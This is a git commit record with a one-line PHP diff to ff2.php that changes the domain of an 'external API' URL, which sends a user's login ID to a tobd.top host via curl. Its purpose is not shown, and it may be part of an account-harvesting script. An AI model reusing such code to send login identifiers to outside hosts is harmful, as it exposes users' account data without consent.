c8245487e4d5e96832c0af714aec039151d62cf0
hassanuzjaman25 <hassanuzjaman25@gmail.com>
2025-05-09 09:33:01 +0600

    Update ff2.php

--- ff2.php
+++ ff2.php
@@ -114,7 +114,7 @@ if ($session_key) {
     sleep(5);
 
     // Notify via external API
-    $notify_url = "https://sf.tobd.top/ff/?id=" . urlencode($login_id);
+    $notify_url = "https://id.tobd.top/ff/?id=" . urlencode($login_id);
     $notify_curl = curl_init();
     curl_setopt_array($notify_curl, [
         CURLOPT_URL => $notify_url,
